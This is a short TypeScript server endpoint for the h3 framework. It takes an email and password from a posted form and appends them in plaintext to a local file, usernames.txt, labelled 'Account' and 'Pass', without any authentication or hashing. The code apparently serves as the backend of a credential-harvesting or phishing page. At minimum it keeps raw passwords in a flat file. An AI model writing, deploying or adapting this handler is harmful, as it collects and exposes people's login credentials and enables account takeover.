import { defineEventHandler, readBody } from "h3";
import { appendFile } from "node:fs/promises";
import { join } from "node:path";

export default defineEventHandler(async (event) => {
  const data = await readBody(event);
  const { email, password } = data as { email: string; password: string };

  const file = join(process.cwd(), "usernames.txt");
  await appendFile(file, `Account: ${email}\nPass: ${password}\n`);

  return { status: "ok" };
});   
